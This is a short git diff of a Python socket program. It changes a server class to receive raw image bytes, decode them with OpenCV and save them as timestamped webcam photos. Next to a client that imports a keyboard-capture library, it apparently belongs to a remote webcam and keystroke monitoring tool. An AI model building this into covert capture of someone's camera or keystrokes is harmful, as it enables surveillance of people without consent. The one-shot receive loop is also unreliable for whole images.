@@ -1,5 +1,8 @@
 import socket
 import keyboard
+import cv2
+import numpy as np
+from datetime import datetime
 
 class Client:
     HOST = ''
@@ -28,12 +31,14 @@ class Server:
         self.PORT = port
 
 
-    def connect(self):
+    def listen(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind((self.HOST, self.PORT))
             s.listen()
             conn, _ = s.accept()
             while 1:
-                data = conn.recv(1024)
-                print(f"Received {data}")
-                # conn.sendall(data)
+                data = conn.recv(5000000) # 5 Megabytes
+                nparr = np.fromstring(data, np.uint8)
+                img_decode = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                time = datetime.now().strftime('%m-%d-%Y-%H-%M-%S')
+                cv2.imwrite(f'webcam/photos/{time}.jpg', img_decode)
